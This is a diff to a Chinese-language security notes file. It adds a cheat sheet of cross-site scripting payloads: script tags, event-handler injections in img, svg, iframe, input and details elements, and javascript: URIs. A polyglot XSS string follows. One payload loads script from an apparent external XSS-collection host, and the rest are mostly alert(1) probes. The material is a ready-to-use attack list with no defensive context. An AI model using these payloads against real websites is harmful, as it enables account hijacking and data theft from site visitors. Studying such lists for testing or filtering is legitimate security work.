@@ -1,3 +1,22 @@
+## 精简版常用payload
+```
+<script>alert(1)</script>
+<script src=https://xsspt.com/VBAhTu></script>
+<a href=javascript:alert(1)>xss</a>
+<svg onload=alert(1)>
+<img src=1 onerror=alert(1)>
+<img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)>
+<details open ontoggle=alert(1)>
+<body onload=alert(1)>
+<M onmouseover=alert(1)>M
+<iframe src=javascript:alert(1)></iframe>
+<iframe onload=alert(1)>
+<input type="submit" onfocus=alert(1)>
+<input type="submit" onclick=alert(1)>
+<form><input type="submit" formaction=javascript:alert(1)>
+```
+来源：https://xz.aliyun.com/t/8501
+
 ## 攻击payload
 ```
 ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
